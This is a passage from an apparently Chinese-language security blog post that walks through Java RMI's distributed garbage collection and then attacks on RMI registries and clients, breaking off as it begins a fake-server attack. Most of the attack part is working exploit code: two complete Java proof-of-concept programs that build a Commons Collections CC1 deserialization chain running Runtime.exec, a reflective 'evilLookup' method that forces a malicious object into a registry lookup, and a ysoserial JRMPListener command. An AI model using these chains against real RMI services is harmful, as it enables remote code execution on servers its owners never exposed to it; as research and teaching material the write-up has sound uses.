<li>客户端定期的向服务器发送租约通知，以保证服务器始终都知道客户端一直持有远程对象的引用。</li>
<li>租约是有期限的，如果期约到期了，服务器则认为客户端已经不再持有远程对象的引用了。</li>
</ul>
<p>在前面创建RMI注册中心和远程对象时，在调试时发现了新的对象：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/9738c3bd/image-20250711170700601.png" alt="image-20250711170700601"></p>
<p>发现在执行<code>ObjectTable.putTarget(target);</code>将target对象存入ObjectTable时，出现了DGCImpl_Stub和DGCImpl_Skel对象。跟进<code>ObjectTable.putTarget(target);</code>方法：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/9738c3bd/image-20250711171324312.png" alt="image-20250711171324312"></p>
<p>这里调用DGCImpl的静态变量，会对DGCImpl进行初始化，主要作用是利用DGC跟踪远程对象的引用并记录日志，而在DGCImpl类中存在静态代码块，跟进一下怎么实现的：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/9738c3bd/image-20250711172443702.png" alt="image-20250711172443702"></p>
<p>这里就说得通了，这里新建了一个DGCImpl对象，并用它来新建了DGCImpl_Skel对象和DGCImpl_Stub代理类，并创建了一个新的target对象存入ObjectTable中。</p>
<p>同时Java提供了java.rmi.dgc.DGC接口，这个接口继承了Remote接口，并且定义了两个重要的方法dirty和clean方法：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/9738c3bd/image-20250711173509809.png" alt="image-20250711173509809"></p>
<p>涉及的类：</p>
<ul>
<li>Lease：一个lease包含了一个唯一的VM标识符和一个租借期限</li>
<li>VMID是跨所有Java虚拟机的唯一标识符</li>
</ul>
<p>其命名规则和处理逻辑都类似于Registry对象</p>
<p>而在客户端查找远程对象时<code>RMIInterface o=(RMIInterface) Naming.lookup(RMI_NAME);</code>，在Registry_Stub.lookup中：<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/9738c3bd/image-20250713195939848.png" alt="image-20250713195939848"></p>
<p>在接受了服务端的返回值后，通过done的后续调用创建DGCImpl_Stub，并调用了其中的DGCImpl_Stub.dirty。在DGCImpl_Stub.dirty方法中，调用完invoke后，进行反序列化操作：<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/9738c3bd/image-20250713200342847.png" alt="image-20250713200342847"></p>
<p>而注册中心在处理请求部分对应于DGCImpl_Skel.dispatch方法，当DGC调用完DGCImpl_Stub.dirty方法</p>
<p>DGCImpl_Skel.dispatch会处理这个方法的请求，对应的switch&#x2F;case语句：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/9738c3bd/image-20250713200620861.png" alt="image-20250713200620861"></p>
<p>这里同样存在反序列化，还原Lease对象</p>
<h2 id="RMI攻击"><a href="#RMI攻击" class="headerlink" title="RMI攻击"></a>RMI攻击</h2><h3 id="攻击注册中心"><a href="#攻击注册中心" class="headerlink" title="攻击注册中心"></a>攻击注册中心</h3><h4 id="基本方法及原理"><a href="#基本方法及原理" class="headerlink" title="基本方法及原理"></a>基本方法及原理</h4><p>我们与注册中心进行交互可以使用如下几种方式</p>
<ul>
<li><strong>0 —- bind  -缺少readObject方法，所以没法达到序列化效果，就无法利用</strong></li>
<li><strong>1 —- list</strong></li>
<li><strong>2 —- lookup</strong></li>
<li><strong>3 —- rebind</strong></li>
<li><strong>4 —- unbind</strong></li>
</ul>
<p>这几种方法位于RegistryImpl_Skel#dispatch中，如果存在readObject，则可以利用</p>
<p>服务端和客户端攻击注册中心的方式是相同的，都是远程获取注册中心后传递一个恶意对象进行利用。</p>
<p>其对应的反序列化触发点在RegistryImpl_Skel.dispatch方法，当客户端调用Naming.lookup方法或者服务端调用Naming.bind等需要操作注册表的方法，注册中心为了处理这些方法的请求都会调用RegistryImpl_Skel.dispatch方法</p>
<h4 id="服务端攻击注册中心"><a href="#服务端攻击注册中心" class="headerlink" title="服务端攻击注册中心"></a>服务端攻击注册中心</h4><h5 id="bind-rebind攻击"><a href="#bind-rebind攻击" class="headerlink" title="bind&#x2F;rebind攻击"></a>bind&#x2F;rebind攻击</h5><p>通过从服务端注册某个恶意远程对象，在注册中心反序列化RemoteCall字节流，从而导致攻击，这个反序列化对象就是远程注册时创建的动态代理类。</p>
<p>其中bind和rebind方法的逻辑是差不多的，bind参数需要是一个Remote类型的对象，而AnnotationInvocationHandler是InvocationHandler的子类，所以我们可以利用AnnotationInvocationHandler来代理Remote接口，通过反射来获取AnnotationInvocation实例：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Class invocation=Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">Constructor constructor=invocation.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">InvocationHandler handler=(InvocationHandler)constructor.newInstance(Retention.class,lazymap);</span><br></pre></td></tr></table></figure>

<p>而看到AnnotationInvocationHandler自然就会想到CC1链，这里直接利用CC1，只是与CC1不同的是RMI是通过执行bind方法将恶意远程对象proxy与注册中心绑定，而在传输时会序列化，当注册中心处理请求时执行RegistryImpl.dispatch时就会进行反序列化绕过调用我们的链子。</p>
<p>完整poc：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> rmi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">server</span> &#123;</span><br><span class="line">    <span class="comment">//rmi服务地址</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String HOST=<span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> PORT=<span class="number">1099</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String RMI_PATH=<span class="string">&quot;/b1uel0n3&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String RMI_NAME=<span class="string">&quot;rmi://&quot;</span>+HOST+<span class="string">&quot;:&quot;</span>+PORT+RMI_PATH;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        LocateRegistry.createRegistry(PORT);</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chaind=<span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap hashMap=<span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        Map lazymap= LazyMap.decorate(hashMap,chaind);</span><br><span class="line">        hashMap.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;b1uel0n3&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Class invocation=Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        Constructor constructor=invocation.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        InvocationHandler handler=(InvocationHandler)constructor.newInstance(Retention.class,lazymap);</span><br><span class="line">        Map proxy=(Map) Proxy.newProxyInstance(Map.class.getClassLoader(),<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;,handler);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">invocationHandler</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(Retention.class, proxy);</span><br><span class="line">        <span class="type">Remote</span> <span class="variable">r</span> <span class="operator">=</span> (Remote)Proxy.newProxyInstance(</span><br><span class="line">                Remote.class.getClassLoader(),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Remote.class &#125;, invocationHandler);</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(PORT);</span><br><span class="line">        registry.bind(RMI_NAME,r);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/9738c3bd/image-20250713225636154.png" alt="image-20250713225636154"></p>
<p>需要注意的是，在处理请求时，注册端会验证服务端地址是否被注册端允许的（默认是只信任本机地址）：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/9738c3bd/image-20250713221944308.png" alt="image-20250713221944308"></p>
<h5 id="unbind攻击"><a href="#unbind攻击" class="headerlink" title="unbind攻击"></a>unbind攻击</h5><p>其实unbind和lookup攻击手法是一样的，看后面客户端lookup的分析</p>
<p>由于checkAccess限制，在jdk8u121之后，会变成先验证再反序列化，即会验证是否为本地地址，此时服务端攻击注册端就不可用了，只能在本地调用bind、unbind、rebind方法。</p>
<h4 id="客户端攻击注册中心"><a href="#客户端攻击注册中心" class="headerlink" title="客户端攻击注册中心"></a>客户端攻击注册中心</h4><h5 id="lookup攻击"><a href="#lookup攻击" class="headerlink" title="lookup攻击"></a>lookup攻击</h5><p>由于jdk8u121之后Java远程访问注册中心做了限制，只有来源地址为本地才能调用bind、rebind、unbind方法。但客户端能执行lookup方法</p>
<p>lookup和unbind攻击手法是一样的，先看注册中心处理请求的源码：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/9738c3bd/image-20250713231216958.png" alt="image-20250713231216958"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/9738c3bd/image-20250713231234021.png" alt="image-20250713231234021"></p>
<p>实际上这两者的攻击思路和<code>bind/rebind</code>是相类似的，但是<code>lookup</code>这里只能传入<code>String</code>字符串，我们可以通过伪造<code>lookup</code>连接请求利用，修改<code>lookup</code>方法，使其可以传入对象</p>
<p>而对象输入跟paramRemotecall相关，所以看能不能控制传输过去的paramRemotecall：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/9738c3bd/image-20250713231830120.png" alt="image-20250713231830120"></p>
<p>通过RegistryImpl_Stub.lookup可以看到，是通过super.ref.invoke()方法来传输到注册中心的</p>
<p>这里我们需要重写lookup，而RemoteCall var2的重写需要this,oprerations，其他的已知，按照传输过程进行编写</p>
<p>先获取RegistryImpl_Stub对象</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Registry</span> <span class="variable">r</span> <span class="operator">=</span> LocateRegistry.getRegistry(HOST, PORT);</span><br></pre></td></tr></table></figure>

<p>然后获取ref:</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/9738c3bd/image-20250713232356903.png" alt="image-20250713232356903"></p>
<p>是一个UnicastRef对象，这是我们被代理的类</p>
<p>这个变量的定义位于Registry_Stub对象父类的父类中，利用反射这样获取</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(HOST,PORT);</span><br><span class="line"><span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> registry.getClass().getSuperclass().getSuperclass().getDeclaredField(<span class="string">&quot;ref&quot;</span>);</span><br><span class="line">f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">System.out.println(f.get(registry));</span><br></pre></td></tr></table></figure>

<p>还需要获取operations，一样通过反射得到:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(HOST,PORT);</span><br><span class="line"><span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> registry.getClass().getDeclaredField(<span class="string">&quot;operations&quot;</span>);</span><br><span class="line">f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">System.out.println(f.get(registry));</span><br></pre></td></tr></table></figure>

<p>接着我们编写一个恶意的evilLookup方法：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">evilLookup</span><span class="params">(Registry r, Object evilObject)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    Field f1=r.getClass().getSuperclass().getSuperclass().getDeclaredField(<span class="string">&quot;ref&quot;</span>);</span><br><span class="line">    f1.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    RemoteRef ref=(RemoteRef) f1.get(r);</span><br><span class="line"></span><br><span class="line">    Field f2=r.getClass().getDeclaredField(<span class="string">&quot;operations&quot;</span>);</span><br><span class="line">    f2.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    Operation[] operations=(Operation[]) f2.get(r);</span><br><span class="line"></span><br><span class="line">    RemoteCall remoteCall=ref.newCall((RemoteObject) r, operations, <span class="number">2</span>, <span class="number">4905912898345647071L</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">ObjectOutput</span> <span class="variable">var3</span> <span class="operator">=</span> remoteCall.getOutputStream();</span><br><span class="line">    var3.writeObject(evilObject);</span><br><span class="line">    ref.invoke(remoteCall);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>前面恶意代理类流程不变，完整poc：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> rmi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutput;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.Operation;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.RemoteCall;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.RemoteObject;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.RemoteRef;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> rmi.server.PORT;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Client</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chaind=<span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap hashMap=<span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        Map lazymap= LazyMap.decorate(hashMap,chaind);</span><br><span class="line">        hashMap.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;b1uel0n3&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Class invocation=Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        Constructor constructor=invocation.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        InvocationHandler handler=(InvocationHandler)constructor.newInstance(Retention.class,lazymap);</span><br><span class="line">        Map proxy=(Map) Proxy.newProxyInstance(Map.class.getClassLoader(),<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;,handler);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">invocationHandler</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(Retention.class, proxy);</span><br><span class="line">        <span class="type">Remote</span> <span class="variable">r</span> <span class="operator">=</span> (Remote)Proxy.newProxyInstance(</span><br><span class="line">                Remote.class.getClassLoader(),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Remote.class &#125;, invocationHandler);</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(PORT);</span><br><span class="line"></span><br><span class="line">        evilLookup(registry,r);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">evilLookup</span><span class="params">(Registry r, Object evilObject)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Field f1=r.getClass().getSuperclass().getSuperclass().getDeclaredField(<span class="string">&quot;ref&quot;</span>);</span><br><span class="line">        f1.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        RemoteRef ref=(RemoteRef) f1.get(r);</span><br><span class="line"></span><br><span class="line">        Field f2=r.getClass().getDeclaredField(<span class="string">&quot;operations&quot;</span>);</span><br><span class="line">        f2.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        Operation[] operations=(Operation[]) f2.get(r);</span><br><span class="line"></span><br><span class="line">        RemoteCall remoteCall=ref.newCall((RemoteObject) r, operations, <span class="number">2</span>, <span class="number">4905912898345647071L</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectOutput</span> <span class="variable">var3</span> <span class="operator">=</span> remoteCall.getOutputStream();</span><br><span class="line">        var3.writeObject(evilObject);</span><br><span class="line">        ref.invoke(remoteCall);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/9738c3bd/image-20250713235837976.png" alt="image-20250713235837976"></p>
<h3 id="攻击客户端"><a href="#攻击客户端" class="headerlink" title="攻击客户端"></a>攻击客户端</h3><h4 id="注册中心攻击客户端"><a href="#注册中心攻击客户端" class="headerlink" title="注册中心攻击客户端"></a>注册中心攻击客户端</h4><p>对于注册中心来说，我们还是从这几个方法触发：</p>
<ul>
<li>bind</li>
<li>unbind</li>
<li>rebind</li>
<li>list</li>
<li>lookup</li>
</ul>
<p>原理就是因为在发起请求后，RegistryImpl_Stub会将请求序列化发送给注册中心RegistryImpl_Skel来进行处理，而除了unbind和rebind都会返回数据给客户端，返回的数据也是经过序列化的，所以到客户端后就会进行反序列化。如果我们能控制注册中心返回数据，就能实现攻击。</p>
<p>可以使用ysoserial的JRMPListener来进行演示</p>
<p>工具地址：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//github.com/frohoff/ysoserial</span></span><br></pre></td></tr></table></figure>

<p>命令：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp .\ysoserial-all.jar ysoserial.exploit.JRMPListener <span class="number">1099</span> CommonsCollections1 <span class="string">&#x27;calc&#x27;</span></span><br></pre></td></tr></table></figure>

<p>客户端访问：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">1099</span>);</span><br><span class="line">        registry.list();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h4 id="服务端攻击客户端"><a href="#服务端攻击客户端" class="headerlink" title="服务端攻击客户端"></a>服务端攻击客户端</h4><p>服务端攻击客户端，通过 服务端返回Object对象 来攻击</p>
<p>当执行远程方法时，传递回来不一定是基础数据类型（String，int），也有可能是对象，当服务端返回给客户端一个对象时，客户端就要进行对应的反序列化操作。</p>
<p>我们需要伪造一个服务器，当客户端调用某个远程方法时，返回的参数是我们的恶意对象：</p>
<p>RMIInterface接口：</p>
